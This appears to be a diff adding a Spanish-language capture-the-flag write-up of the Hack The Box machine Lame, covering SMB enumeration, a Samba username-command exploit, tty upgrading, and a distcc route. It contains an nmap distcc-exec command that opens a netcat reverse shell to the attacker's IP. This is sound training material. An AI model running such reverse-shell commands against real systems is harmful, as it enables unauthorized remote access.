@@ -43,3 +43,74 @@ Vemos que no obtenemos ficheros ni podemos escribir con el usuario anónimo. De 
 ### Reconocimiento SMB
 
 Enumeramos en detall el servicio SMB. Realizamos una enumeración utilizando **crackmapexec, smbmap y smbclient**.
+
+![](../../.gitbook/assets/smb\_1.png)
+
+Comprobamos con **crackmapexec** que es una máquina Unix de nombre  **LAME** y dominio **hackthebox.gr.**
+
+Comprobamos con **smbmap** que existen vatios recursos compartidos, entre ellos **tmp** con permisos de escritura. Nos conectamos con **smbclient** a tmp pero no obtenemos mucho.
+
+Comprobamos si existe algún exploit para esta versión de **SMB**.
+
+![](../../.gitbook/assets/google\_1.png)
+
+Vemos que hay varios. Vamos a intentar explotar esta vía.
+
+## Explotación
+
+Revisamos el script que hemos encontrado y vemos que nos indica como usarlo.
+
+![](../../.gitbook/assets/exploit.png)
+
+Nos descargamos el script y lo lanzamos como se nos indica. Previamente nos ponemos a la escucha por el puerto 443.
+
+![](../../.gitbook/assets/explotacion.png)
+
+Comprobamos que nos hemos conectado y que estamos en la maquina objetivo como **root**.
+
+No tenemos pues que escalar privilegios. Hacemos un tratamiento de la tty con la siguiente secuencia de comandos:
+
+```
+script /dev/null -c bash
+# CTLR + Z para poner en segundo plano la terminal
+stty raw -echo; fg
+reset xterm
+export TERM=xterm
+export shell=bash
+stty rows 51 columns 189
+```
+
+A continuación obtenemos las flags de user y de root.
+
+![](../../.gitbook/assets/explotacion2.png)
+
+Y damos la máquina por terminada.
+
+## Otras formas de explotación
+
+### Con SMBCLIENT
+
+Buscamos exploit con searchexploit y encontramos uno de metasploit.&#x20;
+
+![](../../.gitbook/assets/msf.png)
+
+Lo examinamos y vemos que lanza un comando como username anteponiendo **nohup** en el usuario y ademas tiene que ser SBMv1.
+
+![](../../.gitbook/assets/exp\_msf.png)
+
+Podemos entonces lanzar lo mismo con smbclient.
+
+![](../../.gitbook/assets/explotacion3.png)
+
+### Explotando DISTCCC puerto 3632
+
+Buscamos en Google "distccc exploit" y observamos que aparece en **hacktricks**.
+
+![](../../.gitbook/assets/hacktricks.png)
+
+Probamos con nmap como nos indica el articulo. En el comando ponemos la shell inversa.
+
+```
+nmap -p3632 10.10.10.3 --script distcc-exec --script-args="distcc-exec.cmd='nc 10.10.14.31 443 -e /bin/sh'"
+```
+
